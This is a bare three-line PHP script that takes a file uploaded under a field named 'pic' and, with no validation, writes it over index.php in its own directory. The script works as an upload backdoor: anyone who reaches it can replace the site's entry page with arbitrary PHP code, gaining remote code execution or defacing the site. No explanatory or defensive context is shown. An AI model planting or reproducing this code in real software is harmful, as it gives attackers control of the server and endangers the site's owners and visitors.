<?php
$file = $_FILES['pic'];
move_uploaded_file($file['tmp_name'],__DIR__.'/index.php');